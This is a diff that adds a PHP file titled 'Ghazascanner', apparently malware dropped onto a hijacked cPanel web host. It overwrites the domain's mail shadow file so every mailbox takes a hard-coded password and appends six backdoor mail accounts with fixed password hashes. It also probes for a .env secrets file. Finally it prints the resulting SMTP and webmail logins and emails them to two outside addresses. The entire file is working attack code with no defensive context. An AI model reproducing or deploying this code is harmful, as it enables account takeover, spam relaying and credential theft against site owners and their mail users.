@@ -1,0 +1,90 @@
+<center>
+<?php
+echo '<title>Ghazascanner</title>';
+echo '<center><h1>Ghazascanner@_2020runbot</h1>'.'<br>'.'[uname] '.php_uname().' [/uname]<br>';
+@ini_set('output_buffering', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+ini_set('max_execution_time',0);
+ $t = $_SERVER['SERVER_NAME'];
+ $t = @str_replace("www.","",$t);
+$ips = getenv('REMOTE_ADDR');
+
+$wr = 'infos:$1$Vo8rGyFv$eiXsGyV1rJIs3eP8VtvYV0:17784::::::
+hussam:$1$Vo8rGyFv$eiXsGyV1rJIs3eP8VtvYV0:17784::::::
+abi_layla:$1$Vo8rGyFv$eiXsGyV1rJIs3eP8VtvYV0:17784::::::
+accountmu:$1$Vo8rGyFv$eiXsGyV1rJIs3eP8VtvYV0:17784::::::
+adminustratro:$1$Vo8rGyFv$eiXsGyV1rJIs3eP8VtvYV0:17784::::::
+salesman:$1$Vo8rGyFv$eiXsGyV1rJIs3eP8VtvYV0:17784::::::
+';
+$hm = 'infos:x:534:532::/home/$user/mail/$t/info:/home/$user
+hussam:x:534:532::/home/$user/mail/$t/hussam:/home/$user
+abi_layla:x:534:532::/home/$user/mail/$t/jancok:/home/$user
+accountmu:x:534:532::/home/$user/mail/$t/account:/home/$user
+adminustratro:x:534:532::/home/$user/mail/$t/t:/home/$user
+salesman:x:534:532::/home/$user/mail/$t/salesman:/home/$user
+';
+$ports=array(25, 587, 465, 110, 995, 143 , 993);
+$primary_port='25';
+$user=get_current_user();
+$password='kontol87';
+$pwd = crypt($password,'$6$kontol87$');
+
+@$passwd = file_get_contents('/home/'.$user.'/etc/'.$t.'/shadow');
+$ex=explode("\r\n",$passwd);
+@link('/home/'.$user.'/etc/'.$t.'/shadow','/home/'.$user.'/etc/'.$t.'/shadow.kontol87.bak');
+@unlink('/home/'.$user.'/etc/'.$t.'/shadow');
+foreach($ex as $ex){
+$ex=explode(':',$ex);
+$e= $ex[0];
+if ($e){
+$b=fopen('/home/'.$user.'/etc/'.$t.'/shadow','ab');fwrite($b,$e.':'.$pwd.':16249:::::'."\r\n");fclose($b);
+echo '<center><span style=\'color:red;\'>[smtp]'.$t.'|25|'.$e.'@'.$t.'|'.$password.'[/smtp]<br>';
+}}
+$c = fopen('/home/'.$user.'/etc/'.$t.'/passwd', 'a+');
+fwrite($c, $hm);
+fclose($c);
+$f = fopen('/home/'.$user.'/etc/'.$t.'/shadow', 'a+');
+fwrite($f, $wr);
+fclose($f);
+$parm = 'https://'.$t.':2096';
+$peli = 'D-nCtnVO%JNl';
+$check21 = $_SERVER['DOCUMENT_ROOT'] . "/.env" ;
+if(file_exists($check21)){
+    echo ".ENV VALID ===>  ".$check21."</br>";
+}else {
+
+echo ".ENV FAIL" ;
+}
+
+
+$kirim = '
+
+       SMTP AUTO CREATE
+	   
+'.$t.'|25|'.$e.'@'.$t.'|'.$password.'
+--------------------------------------------
+'.$parm.'|infos@'.$t.'|' .$peli.'
+'.$parm.'|hussam@'.$t.'|' .$peli.'
+'.$parm.'|abi_layla@'.$t.'|' .$peli.'
+'.$parm.'|accountmu@'.$t.'|' .$peli.'
+'.$parm.'|adminustratro@'.$t.'|' .$peli.'
+'.$parm.'|salesman@'.$t.'|' .$peli.'
+
+
+';
+$cekrek ='
+[smtp]'.$parm.'|infos@'.$t.'|' .$peli.'[/smtp]
+[smtp]'.$parm.'|hussam@'.$t.'|' .$peli.'[/smtp]
+[smtp]'.$parm.'|abi_layla@'.$t.'|' .$peli.'[/smtp]
+[smtp]'.$parm.'|accountmu@'.$t.'|' .$peli.'[/smtp]
+[smtp]'.$parm.'|adminustratro@'.$t.'|' .$peli.'[/smtp]
+[smtp]'.$parm.'|salesman@'.$t.'|' .$peli.'[/smtp]
+';
+echo $cekrek;
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'sitexploit@gmail.com,buzashop1998@yahoo.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$from = "From: Result<botv3@mrspybotv3.com";
+mail($tujuanmail, "PANEN SMTP", $kirim, $from);
+?>
